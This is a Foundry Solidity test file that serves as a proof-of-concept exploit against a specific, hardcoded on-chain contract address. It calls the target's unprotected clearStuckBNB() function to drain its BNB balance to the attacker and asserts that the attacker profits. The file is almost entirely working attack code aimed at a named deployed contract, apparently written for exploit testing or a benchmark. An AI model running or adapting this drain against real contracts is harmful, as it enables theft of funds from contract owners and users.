// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ITarget {
    function clearStuckBNB() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "Victim Contract");
        vm.label(attacker, "Attacker");
        // Inject BNB into target contract so there's something to drain
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Record initial attacker balance
        console.log("Initial attacker balance:", initialBalance);
        console.log("Target contract BNB balance:", address(TARGET).balance);

        // Exploit: Call the vulnerable clearStuckBNB function
        ITarget(TARGET).clearStuckBNB();

        // Verify the exploit worked - attacker balance should increase
        uint256 finalBalance = address(attacker).balance;
        console.log("Final attacker balance:", finalBalance);

        // Oracle check: attacker balance must increase
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after exploit");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
